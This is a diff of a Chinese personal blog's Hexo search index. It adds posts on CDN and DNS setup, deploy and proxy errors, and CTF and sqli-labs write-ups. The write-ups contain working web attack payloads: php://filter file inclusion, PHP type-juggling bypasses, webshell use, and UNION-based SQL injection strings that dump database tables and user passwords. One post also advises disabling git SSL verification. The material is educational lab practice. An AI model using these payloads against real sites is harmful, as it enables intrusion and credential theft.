@@ -334,6 +334,25 @@
       </tags>
   </entry>
   <entry>
+    <title>阿里云CDN加速域名解析冲突问题</title>
+    <url>/2020/10/11/ALi/</url>
+    <content><![CDATA[<p>自己的个人博客搭建了也有一段时间了，以前部署在Gitee上访问速度还行，后来部署到GitHub后速度是一天不如一天了，于是想看看能不能加速一下，看了看网上的做法，我选择采用CDN加速域名。</p>
+<p>首先，你需要将域名进行备案，备案完成后才能进行后续操作。</p>
+<p>然后我选择的是阿里云的CDN（腾讯云貌似有6个月的免费试用，但是由于我是阿里云的域名，去腾讯云搞又得在那边域名备案，就放弃了）</p>
+<p>前面按照网上的步骤走都没啥问题，但当进行到向域名解析中添加一条CNAME记录时显示与A解析冲突（<strong>A解析是当初绑定域名的时候添加的</strong>），我看了看阿里云提供的Tip，但是我还是不太明白怎么操作，尝试将原来的A解析删除，换成CNAME，换完发现我的博客直接502了。后来联系阿里云客服才将问题解决。</p>
+<p>如果你也出现了同样的问题，首先，你检查一下你将顶级域名添加到CDN时设置的源站IP是不是A解析记录里的那个IP（我犯的错是将源站IP设置成了阿里云服务器的IP），如果不是，改过来，然后删除A解析，添加CNAME解析（CNAME解析的添加根据提示做就行了），然后就大功告成了。</p>
+<hr>
+<p>u1s1,阿里云的客服态度蛮好的，晚上10点多了还为我耐心解答问题，在此致谢！</p>
+]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>CDN</tag>
+        <tag>解析冲突</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hexo 添加AI摘要功能</title>
     <url>/2025/12/05/AI-summary/</url>
     <content><![CDATA[<p>最近浏览技术博客时，发现像CSDN都会有 **AI 摘要 ** 功能，觉得还算是一个实用的功能，所以作为一个热衷于折腾 Hexo 的博主，我也决定动手给自己的博客加上这个功能。</p>
@@ -697,25 +716,6 @@ ${cleanContent}
         <tag>DeepSeek</tag>
         <tag>Node.js</tag>
         <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>阿里云CDN加速域名解析冲突问题</title>
-    <url>/2020/10/11/ALi/</url>
-    <content><![CDATA[<p>自己的个人博客搭建了也有一段时间了，以前部署在Gitee上访问速度还行，后来部署到GitHub后速度是一天不如一天了，于是想看看能不能加速一下，看了看网上的做法，我选择采用CDN加速域名。</p>
-<p>首先，你需要将域名进行备案，备案完成后才能进行后续操作。</p>
-<p>然后我选择的是阿里云的CDN（腾讯云貌似有6个月的免费试用，但是由于我是阿里云的域名，去腾讯云搞又得在那边域名备案，就放弃了）</p>
-<p>前面按照网上的步骤走都没啥问题，但当进行到向域名解析中添加一条CNAME记录时显示与A解析冲突（<strong>A解析是当初绑定域名的时候添加的</strong>），我看了看阿里云提供的Tip，但是我还是不太明白怎么操作，尝试将原来的A解析删除，换成CNAME，换完发现我的博客直接502了。后来联系阿里云客服才将问题解决。</p>
-<p>如果你也出现了同样的问题，首先，你检查一下你将顶级域名添加到CDN时设置的源站IP是不是A解析记录里的那个IP（我犯的错是将源站IP设置成了阿里云服务器的IP），如果不是，改过来，然后删除A解析，添加CNAME解析（CNAME解析的添加根据提示做就行了），然后就大功告成了。</p>
-<hr>
-<p>u1s1,阿里云的客服态度蛮好的，晚上10点多了还为我耐心解答问题，在此致谢！</p>
-]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>CDN</tag>
-        <tag>解析冲突</tag>
       </tags>
   </entry>
   <entry>
@@ -1100,6 +1100,39 @@ http://url/CVS/Entries 返回所有文件的结构
       </tags>
   </entry>
   <entry>
+    <title>博客发布时 hexo d 命令报错</title>
+    <url>/2021/03/17/GitQues/</url>
+    <content><![CDATA[<p>hexo 博客在hexo d 部署时报错</p>
+<p>问题描述：</p>
+<p>博客闲置了一段时间，最近想在上面记录一些自己遇到的问题和学习上的一些东西，<code>hexo s</code>正常，但是<code>hexo g</code>后进行<code>hexo d</code>时报错：</p>
+<p><code>fatal: unable to access ‘https: [//github.com/***](https://github.com/***)’: Failed to connect to [github.com](http://github.com/) port 443:Timed out</code></p>
+<p>起初我再执行几次<code>hexo d</code>就可以正常部署了，我也没有在意。但昨天晚上怎么试都不行，就想彻底解决一下。去网上找了很多方法试了都不太行，后来通过下面这两篇博客里的方法进行尝试成功将问题解决，在此记录一下。其实就是将我们的博客重新部署到Github上。（当然，方法不一定适用与每一个人，但应该是一种解决方法）</p>
+<p><a href="https://blog.csdn.net/weixin_30940783/article/details/99581061?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-4.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-4.control">针对github权限导致hexo部署失败的解决方案</a></p>
+<p><a href="https://blog.csdn.net/qq_43768946/article/details/90411154">Git使用出现git@github.com: Permission denied (publickey). 处理</a></p>
+<hr>
+<p>emmm,在准备把这篇博客部署的时候hexo d 又报错了，无语了。上面的方法仅供参考吧，今天我找到一种可行的方法。（至少暂时还没翻车）</p>
+<p><a href="https://sevencho.github.io/archives/8e3becb8.html">记一次Hexo博客部署缓慢的解决办法</a></p>
+<p>加油，打工人！</p>
+<p>更新：</p>
+<p><a href="https://segmentfault.com/a/1190000018624911?utm_source=tag-newest">https://segmentfault.com/a/1190000018624911?utm_source=tag-newest</a></p>
+<p>按照这篇文章中说的方法一也可以解决该问题：</p>
+<p>取消http代理：</p>
+<pre><code class="line-numbers language-shell">$ git config --global --unset http.proxy
+$ git config --global --unset https.proxy
+</code></pre>
+<p>设置env <code>GIT_SSL_NO_VERIFY</code>为<code>true</code>然后再次部署：</p>
+<pre><code class="line-numbers language-shell">$ env GIT_SSL_NO_VERIFY=true hexo d
+</code></pre>
+]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>Git</tag>
+        <tag>Hexo部署</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Google AI Studio部署自己的应用</title>
     <url>/2026/01/05/Gemini%E7%94%9F%E6%88%90%E5%B9%B6%E9%83%A8%E7%BD%B2%E8%87%AA%E5%B7%B1%E7%9A%84%E5%BA%94%E7%94%A8/</url>
     <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote>
@@ -1260,36 +1293,395 @@ npm run dev
       </tags>
   </entry>
   <entry>
-    <title>博客发布时 hexo d 命令报错</title>
-    <url>/2021/03/17/GitQues/</url>
-    <content><![CDATA[<p>hexo 博客在hexo d 部署时报错</p>
-<p>问题描述：</p>
-<p>博客闲置了一段时间，最近想在上面记录一些自己遇到的问题和学习上的一些东西，<code>hexo s</code>正常，但是<code>hexo g</code>后进行<code>hexo d</code>时报错：</p>
-<p><code>fatal: unable to access ‘https: [//github.com/***](https://github.com/***)’: Failed to connect to [github.com](http://github.com/) port 443:Timed out</code></p>
-<p>起初我再执行几次<code>hexo d</code>就可以正常部署了，我也没有在意。但昨天晚上怎么试都不行，就想彻底解决一下。去网上找了很多方法试了都不太行，后来通过下面这两篇博客里的方法进行尝试成功将问题解决，在此记录一下。其实就是将我们的博客重新部署到Github上。（当然，方法不一定适用与每一个人，但应该是一种解决方法）</p>
-<p><a href="https://blog.csdn.net/weixin_30940783/article/details/99581061?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-4.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-4.control">针对github权限导致hexo部署失败的解决方案</a></p>
-<p><a href="https://blog.csdn.net/qq_43768946/article/details/90411154">Git使用出现git@github.com: Permission denied (publickey). 处理</a></p>
-<hr>
-<p>emmm,在准备把这篇博客部署的时候hexo d 又报错了，无语了。上面的方法仅供参考吧，今天我找到一种可行的方法。（至少暂时还没翻车）</p>
-<p><a href="https://sevencho.github.io/archives/8e3becb8.html">记一次Hexo博客部署缓慢的解决办法</a></p>
-<p>加油，打工人！</p>
-<p>更新：</p>
-<p><a href="https://segmentfault.com/a/1190000018624911?utm_source=tag-newest">https://segmentfault.com/a/1190000018624911?utm_source=tag-newest</a></p>
-<p>按照这篇文章中说的方法一也可以解决该问题：</p>
-<p>取消http代理：</p>
-<pre><code class="line-numbers language-shell">$ git config --global --unset http.proxy
-$ git config --global --unset https.proxy
-</code></pre>
-<p>设置env <code>GIT_SSL_NO_VERIFY</code>为<code>true</code>然后再次部署：</p>
-<pre><code class="line-numbers language-shell">$ env GIT_SSL_NO_VERIFY=true hexo d
-</code></pre>
+    <title>Vscode_Error</title>
+    <url>/2023/08/06/Vscode-Error/</url>
+    <content><![CDATA[<h3 id="一、问题概述"><a href="#一、问题概述" class="headerlink" title="一、问题概述"></a>一、问题概述</h3><blockquote>
+<p>vscode 获取扩展失败，XHR failed</p>
+</blockquote>
+<p>平时vscode只是用来跑一跑C/C++代码，最近想装一个插件的时候在插件商店搜索的时候却报错XHR failed，然后在网上查了查，似乎是连不上网，可能是代理出了问题。这才想起来似乎vscode好久没有给我推过版本更新或者推荐插件什么的了，可能是无法联网的原因。</p>
+<h3 id="二、解决方法"><a href="#二、解决方法" class="headerlink" title="二、解决方法"></a>二、解决方法</h3><p>网上的解决方法是修改vscode里的设置，将代理移除，但是我按照这种方法并不奏效。</p>
+<p><a href="https://blog.csdn.net/SUDA196/article/details/127104495">Win10解决vscode获取扩展失败，XHR failed（亲测可以解决）_苏打不会碱的博客-CSDN博客</a></p>
+<p>后来在查找解决方法的时候偶然发现了这篇文章：</p>
+<p><a href="https://www.cnblogs.com/joyzen/p/13815384.html">VS Code代理设置错误 - 许你一世煙花 - 博客园 (cnblogs.com)</a></p>
+<p>里面提到：</p>
+<blockquote>
+<p>VS Code会去读取系统变量HTTP_PROXY的值设置为代理地址，去查了下系统环境变量设置里面果真有这个变量，删除后即可解决VS Code商店连不上的问题</p>
+</blockquote>
+<p>按照他的方法我确实在电脑上找到了HTTP＿PROXY（我的是小写）这个系统变量，并且它的值是127.0.0.1:32100(可能是这样，删的果断了点没太记住)。按道理来说我的代理的端口是7890，显然他这里的端口值不太对，我没有去修改而是直接删除了这个变量。</p>
+<p>删除后我尝试重启vscode，试了下发现还是连不上网，发现是因为我的vscode设置中设置了代理<code>http://127.0.0.1:7890</code>，但是我此时并没有开启代理，将代理开启后就可以正常联网了。</p>
+<p><img src="https://aband0n.oss-cn-nanjing.aliyuncs.com/img/image-20230806154211788.png" alt="image-20230806154211788"></p>
+<p>当然，如果不想开代理的话就将上面的<code>http://127.0.0.1:7890</code>删除，这样不开代理的情况下也可以正常联网。</p>
+<h3 id="三、意外收获"><a href="#三、意外收获" class="headerlink" title="三、意外收获"></a>三、意外收获</h3><p>上面那篇文章中还提到了一点：</p>
+<blockquote>
+<p>同时还发现HTTP_PROXY这个环境变量还被被其他软件环境读取作为代理地址，比如yarn，造成依赖下载被代理到指定地址导致失败。</p>
+</blockquote>
+<p>其他软件也会读取HTTP_PROXY这个环境变量作为代理地址，突然想起之前自己电脑在使用群晖chat（Synology chat）的时候客户端一直无法正常登录，但是使用虚拟机或者其他人的电脑就可以正常登录，很奇怪，当时怀疑是自己电脑某个端口或者设置导致的，但是在网上搜索了很久都没有找到解决方案，一直搁置，使用的网页版。</p>
+<p>所以我突然想到会不会当时无法登录也是因为这个环境变量呢？抱着试一试的心态打开客户端登录了一下，发现居然登陆成功了！害人不浅啊这个环境变量！<span class="github-emoji"><span>😭</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+<p>所以如果你有某些软件一直登录不成功，不妨也检查一下自己的环境变量。</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>Vscode</tag>
+        <tag>Synology</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo matery主题代码高亮问题</title>
+    <url>/2020/09/26/hexo/</url>
+    <content><![CDATA[<p>关于matery主题代码高亮的问题</p>
+<p>转载自大佬们的博客:</p>
+<p><a href="https://www.jianshu.com/p/f395d92a1110">Hexo博客：六、prism代码高亮</a></p>
+<p><a href="https://blog.csdn.net/zemprogram/article/details/104421008">个人博客搭建笔记—-hexo主题代码高亮</a></p>
 ]]></content>
       <categories>
         <category>Hexo</category>
       </categories>
       <tags>
-        <tag>Git</tag>
-        <tag>Hexo部署</tag>
+        <tag>hexo</tag>
+        <tag>代码高亮</tag>
+        <tag>matery</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>YCBCTF wp</title>
+    <url>/2020/09/10/YCBCTF/</url>
+    <content><![CDATA[<p>“羊城杯”，开学后打的一场比赛，由于我实在是太菜了，只会写第一题<span class="github-emoji"><span>😭</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+<span id="more"></span>
+
+<p>尝试访问一波index.php，页面出现<code>eval post cmd</code>,貌似是一句话木马。</p>
+<img src="/2020/09/10/YCBCTF/image-20200910224747632.png" alt="image-20200910224747632" style="zoom:50%;">
+
+
+
+<p>尝试用蚁剑连接一下，密码试一下cmd,连接成功！</p>
+<img src="/2020/09/10/YCBCTF/image-20200910224833992.png" alt="image-20200910224833992" style="zoom:50%;">
+
+
+
+<p>并没有找到flag.php或者含flag字样的东西，倒是发现一个bbbbbbbbb.txt，十分可疑，下载后打开发现是一堆奇奇怪怪的字符。想到可能是图片编码，尝试反向解码。找一个解码网站，将txt中的内容复制进去，显示格式错误。后来了解到要解码还得在前面加上一小串东西：<strong>data:image/jpg;base64,</strong>    解码成功！flag就在图片中，奇怪的知识又增加了<span class="github-emoji"><span>😄</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>。</p>
+<p><img src="/2020/09/10/YCBCTF/image-20200910224632204.png" alt="image-20200910224632204"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MoeCTF wp</title>
+    <url>/2020/08/14/moectf/</url>
+    <content><![CDATA[<img src="/2020/08/14/moectf/image-20200816135721888.png" alt="image-20200816135721888" style="zoom:50%;">
+
+<p>MoeCTF，西安电子科技大学的新生赛，作为一个南邮的小菜鸡，成功通过wh1sper师傅提供的后门混入其中<span class="github-emoji"><span>😉</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f609.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，借此锻炼锻炼自己的能力，同时也为0xGame做准备。冲冲冲！</p>
+<span id="more"></span>
+
+<h4 id="1-GET"><a href="#1-GET" class="headerlink" title="1.GET"></a>1.GET</h4><p>这是一道简单的get传参的题，直接在url里传a这个参数<code>?a=flag</code>，即可得到flag</p>
+<hr>
+<h4 id="2-POST"><a href="#2-POST" class="headerlink" title="2.POST"></a>2.POST</h4><p>这是一道简单的post传参的题，利用hackbar（火狐浏览器的插件，不了解的话可自行百度一下，安装啥的不难的）即可传参，或者利用bp应该也是一样的。</p>
+<img src="/2020/08/14/moectf/image-20200814140353992.png" alt="image-20200814140353992" style="zoom:50%;">
+
+<hr>
+<h4 id="3-小饼干"><a href="#3-小饼干" class="headerlink" title="3.小饼干"></a>3.小饼干</h4><p>进入页面发现是一个空页面，这时候想到利用bp抓包，观察</p>
+<img src="/2020/08/14/moectf/image-20200814140801922.png" alt="image-20200814140801922" style="zoom: 67%;">
+
+<p>发现类似flag的东西。复制提交，发现就是正确的flag</p>
+<hr>
+<h4 id="4-Introduction"><a href="#4-Introduction" class="headerlink" title="4.Introduction"></a>4.Introduction</h4><p>这个题点进去的话就是很正常的对<strong>moectf</strong>的介绍，点进去源码也没看到flag     (好吧，是我眼瞎，后来才发现flag就在源码里)  尝试抓包，也没找到</p>
+<img src="/2020/08/14/moectf/image-20200814142428514.png" alt="image-20200814142428514" style="zoom: 67%;">
+
+<p>考的是眼力<span class="github-emoji"><span>👿</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f47f.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+<hr>
+<h4 id="5-一句话木马"><a href="#5-一句话木马" class="headerlink" title="5.一句话木马"></a>5.一句话木马</h4><p>进入题目，发现源码就是一句话木马</p>
+<img src="/2020/08/14/moectf/image-20200814142846791.png" alt="image-20200814142846791">
+
+<p>话不多说，直接掏出俺的<strong>蚁剑</strong></p>
+<img src="/2020/08/14/moectf/image-20200814143147631.png" alt="image-20200814143147631" style="zoom: 50%;">
+
+<p>这边的话要注意的就是连接密码一定别忘记，<strong>密码就是post后面单引号里的内容</strong>。</p>
+<img src="/2020/08/14/moectf/image-20200814143913525.png" alt="image-20200814143913525" style="zoom: 50%;">
+
+<p>连接成功！一般情况下flag就在根目录/下，去到这道题的根目录下的确发现了flag。</p>
+<hr>
+<h4 id="6-ezmath"><a href="#6-ezmath" class="headerlink" title="6.ezmath"></a>6.ezmath</h4><p>等待填坑</p>
+<hr>
+<h4 id="7-三心二意"><a href="#7-三心二意" class="headerlink" title="7.三心二意"></a>7.三心二意</h4><p>根据hint及观察代码，这应该是一道考察php弱类型相等的题。</p>
+<pre><code class="line-numbers language-php">&lt;?php
+$a = $_GET['a'];
+$b = $_POST['b'];
+$c = $_REQUEST['c'];
+$d = $_COOKIE['d'];
+
+if (!isset($a, $b, $c, $d)) {
+    highlight_file(__FILE__);
+} else {
+    if (is_numeric($a) and $a == false) {
+        echo 'A is OK!';
+        echo '&lt;br/&gt;';
+        if (!is_numeric($b) and $b == 0x125e591) {
+            echo 'B is OK!';
+            echo '&lt;br/&gt;';
+            if ($c != 240610708 and md5($c) == md5(240610708)) {
+                echo 'C is OK!';
+                echo '&lt;br/&gt;';
+                if (strlen($d) &lt; 7 and $d != 0 and $d ** 2 == 0) {
+                    include('/flag');
+                } else {
+                    echo "D is not wanted.&lt;br/&gt;";
+                    highlight_file(__FILE__);
+                }
+            } else {
+                echo "C is not wanted.&lt;br/&gt;";
+                highlight_file(__FILE__);
+            }
+        } else {
+            echo "Too young too simple.&lt;br/&gt;";
+            highlight_file(__FILE__);
+        }
+    } else {
+        echo "A is not wanted.&lt;br/&gt;";
+        highlight_file(__FILE__);
+    }
+} 
+</code></pre>
+<p>u1s1,我刷题的确太少了，对于题目中的几个判断都不是很熟悉，不知道怎么去绕过，一个一个做解释吧<span class="github-emoji"><span>😢</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+<ul>
+<li><code>is_numeric($a) and $a == false</code></li>
+</ul>
+<p>此处涉及到**is_numeric()**这个php函数,<strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串,如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。</p>
+<p>也就是说上面这个语句要求a参数是一个数字或字符串，且==false，那挺简单的，0或者null都可以，尝试?a=0,回车一下发现没反应，仔细看源码才发现他要a,b,c,d四个变量都存在才行。</p>
+<ul>
+<li><p><code>!is_numeric($b) and $b == 0x125e591</code></p>
+<p>这个语句的要求是b变量不是数字或字符串并且b==0x125e591，关于0x125e591，我也不太清楚他是个啥，看起来像16进制，百度一波</p>
+<img src="/2020/08/14/moectf/image-20200921134750652.png" alt="image-20200921134750652" style="zoom:50%;">
+
+<p>好家伙！直接给我转换出来了。没错了，0x125e591是16进制，转成10进制就是19260817。</p>
+<blockquote>
+<p>php有两种比较方式,一种是“= =”一种是“= = =”</p>
+<p>“= =”：会把两端变量类型转换成相同的，再进行比较。</p>
+<p>“= = =”：会先判断两端变量类型是否相同，再进行比较。</p>
+<p>这里明确说明，<strong>在两个相等的符号中，一个字符串与一个数字相比较时，字符串会转换成数值</strong>。</p>
+<p>当一个字符串被当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内，该字符串被当作int来取值。其他所有情况下都被作为float来取值，<strong>该字符串的 开始部分 决定了它的值，如果该字符串以合法的数值开始，则使用该数值， 否则其值为0 。</strong></p>
+<p>在进行比较运算时，如果遇到了 0e 这类字符串，PHP会将它解析为 科学计数法</p>
+<p>在进行比较运算时，如果遇到了 0x 这类字符串，PHP会将它解析为 十六进制 。</p>
+</blockquote>
+<p>然后经过大佬指点和我的测试，我发现只需要在19260817后面加上字母就行了<span class="github-emoji"><span>😸</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f638.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+</li>
+<li><p><code>$c != 240610708 and md5($c) == md5(240610708)</code></p>
+<p>这个的话主要是md5值的知识，上网一查，md5(‘240610708’)等于md5(‘QNKCDZO’)，于是直接吧c赋值成后面那个字符串。</p>
+</li>
+<li><p><code>strlen($d) &lt; 7 and $d != 0 and $d ** 2 == 0</code></p>
+<p>这个一开始是真的不会，后来还是一个学弟教我的，害。</p>
+<p>考点应该是<strong>md5()函数无法处理数组，如果传入的为数组，会返回NULL</strong>（之前应该遇到过，忘记了。。。）</p>
+<p>所以此处将d赋值成<code>d[]=0</code>,妙啊。</p>
+<p>所以最终传参如下：</p>
+<img src="/2020/08/14/moectf/image-20200921143630484.png" alt="image-20200921143630484" style="zoom:67%;"></li>
+</ul>
+<p>再贴一道与这道题很像的题：（来自CNSS）</p>
+<pre><code class="line-numbers language-php">&lt;?php
+highlight_file(__FILE__);
+$a = $_GET['a'];
+$b = $_POST['b'];
+$c = $_REQUEST['c'];
+$d = $_COOKIE['d'];
+
+if (isset($a) &amp;&amp; !is_numeric($a) &amp;&amp; $a == 114514) {
+    echo "A is ok!";
+    if (isset($b) &amp;&amp; $b != 0 &amp;&amp; $b ** 2 == 0) {
+        echo "B is ok!";
+        if (isset($c) &amp;&amp; isset($d) &amp;&amp; $c !== $d &amp;&amp; md5($c) === md5($d)) {
+            echo "C is ok!";
+            echo "Here is your flag:";
+            include('/flag');
+        } else {
+            die((isset($c) &amp;&amp; isset($d)) ? "Try to search something?" : "C and D is wanted.");
+        }
+    } else {
+        die(isset($b) ? "You need to try again." : "B is wanted.");
+    }
+} else {
+    die(isset($a) ? "Please try another a." : "A is wanted.");
+} 
+</code></pre>
+<hr>
+<h4 id="8-俄罗斯头套"><a href="#8-俄罗斯头套" class="headerlink" title="8.俄罗斯头套"></a>8.俄罗斯头套</h4><img src="/2020/08/14/moectf/image-20200814145058030.png" alt="image-20200814145058030" style="zoom:67%;">
+
+<p>点进去后发现这样一句话，觉得应该得<strong>burpsuits</strong>伪造一波ip地址</p>
+<p><img src="/2020/08/14/moectf/image-20200814145154603.png" alt="image-20200814145154603"></p>
+<p>抓包后添加 <strong>X-Forwarded-For</strong>头，伪造一波ip地址，send一下，得到如下页面</p>
+<img src="/2020/08/14/moectf/image-20200814145736400.png" alt="image-20200814145736400" style="zoom:50%;">
+
+<p>然后注意到response里说我得是从<a href="https://www.baidu.com来的，根据之前的做题经验的话，再添加一个**Referer**头即可，如下：">https://www.baidu.com来的，根据之前的做题经验的话，再添加一个**Referer**头即可，如下：</a></p>
+<img src="/2020/08/14/moectf/image-20200814150025874.png" alt="image-20200814150025874" style="zoom:50%;">
+
+<p>发现<strong>response</strong>里又要求使用Post请求，这个之前的确没遇到过，观察了一波现有的头，发现第一个头是Get，尝试将其修改为Post后send一波，得到如下信息：</p>
+<img src="/2020/08/14/moectf/image-20200814150414403.png" alt="image-20200814150414403" style="zoom:50%;">
+
+<p>好吧，没完了，不愧是俄罗斯头套<span class="github-emoji"><span>😢</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>  不过supreme浏览器是什么鬼，我去百度了一波，靠，好像还真有这个浏览器，不会吧，不会吧，不会要去用这个浏览器去解题吧，那样还得重新配置<strong>burpsuits</strong>.</p>
+<p>我去百度了一波burpsuits里浏览器是由哪个头去表示的，发现是由user-Agent去决定的，</p>
+<img src="/2020/08/14/moectf/image-20200814150944737.png" alt="image-20200814150944737" style="zoom:50%;">
+
+<p>仔细看了看burpsuits里那个头的内容，发现了一个Firefox，盲猜指的是所用的firefox浏览器，尝试将它改为题目中要求的supreme浏览器， 成功！</p>
+<hr>
+<h4 id="9-Moe-include"><a href="#9-Moe-include" class="headerlink" title="9.Moe include"></a>9.Moe include</h4><p>看这题目标题，应该和文件包含漏洞有关，点进去看一下：</p>
+<p><img src="/2020/08/14/moectf/image-20200816140535894.png" alt="image-20200816140535894"></p>
+<p>让我别点，那一定得点一下了<span class="github-emoji"><span>😝</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+<img src="/2020/08/14/moectf/image-20200816140646912.png" alt="image-20200816140646912" style="zoom: 67%;">
+
+<p>发现回显的页面为空，但是注意到url里多了一个<code>?file=hint.php</code></p>
+<p>hint是提示的意思，访问hint.php试试，回显的依旧是空页面，抓包看看：</p>
+<img src="/2020/08/14/moectf/image-20200816141033076.png" alt="image-20200816141033076" style="zoom:67%;">
+
+<p>看到注释：<strong>你知道php伪协议吗？</strong></p>
+<p>不知道的话可以参考参考这篇博客：<a href="https://www.cnblogs.com/zzjdbk/p/13030717.html"></a><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">php伪协议总结</a></p>
+<p>文件包含直接读取的是文件，而不是文件源码，所以要想办法读取源码.结合之前的做题经验，尝试了一下用<code>php://filter</code>去读取文件</p>
+<p>尝试构造如下paylaod:<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<img src="/2020/08/14/moectf/image-20200816142441015.png" alt="image-20200816142441015" style="zoom:67%;">
+
+<p>然后对得到的字符串进行base64解密即可得到flag.<span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+<hr>
+<h4 id="10-Moe-unserialize"><a href="#10-Moe-unserialize" class="headerlink" title="10.Moe unserialize"></a>10.Moe unserialize</h4><p>等待填坑</p>
+<hr>
+<h4 id="11-EzXXE"><a href="#11-EzXXE" class="headerlink" title="11.EzXXE"></a>11.EzXXE</h4><p>等待填坑</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs-master 刷题记录</title>
+    <url>/2020/10/18/sqlilab/</url>
+    <content><![CDATA[<h3 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h3><p>注入的分类：数字型和字符型。攻击者目的只有一点，那就是绕过程序的限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限。</p>
+<h4 id="1、数字型注入"><a href="#1、数字型注入" class="headerlink" title="1、数字型注入"></a>1、数字型注入</h4><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
+<p>测试步骤：</p>
+<p>（1） 加单引号，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a>’</p>
+<p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
+<p>（2） 加and 1=1 ,URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=1</p>
+<p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</p>
+<p>（3） 加and 1=2，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=2</p>
+<p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p>
+<p>如果满足以上三点，则可以判断该URL存在数字型注入。</p>
+<h4 id="2、字符型注入"><a href="#2、字符型注入" class="headerlink" title="2、字符型注入"></a>2、字符型注入</h4><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+<p>例如数字型语句：select * from table where id =3</p>
+<p>则字符型如下：select * from table where name=’admin’</p>
+<p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p>
+<p>测试步骤：</p>
+<p>（1） 加单引号：select * from table where name=’admin’’</p>
+<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
+<p>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p>
+<p>Mysql 有三种常用注释符：</p>
+<p>– 注意，这种注释符后边有一个空格</p>
+<p># 通过#进行注释 即**%23**</p>
+<p>/* */ 注释掉符号内的内容</p>
+<p>因此，构造语句为：select * from table where name =’admin’ and 1=1—’ 可成功执行返回结果正确；</p>
+<h3 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h3><p>查看有多少列：</p>
+<p><code>?id=1 order by 3--+</code></p>
+<p>查看所有的数据库：</p>
+<p><code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p>
+<p>查看所有的表：</p>
+<p><code>?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code>  （<strong>0x7365637572697479对应的字符串是security</strong>）</p>
+<p>查看所有的字段：</p>
+<p><code>?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code>     (<strong>0x7573657273对应的字符串是users</strong>)</p>
+<p>查看所有用户名和密码：</p>
+<p><code>union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</code></p>
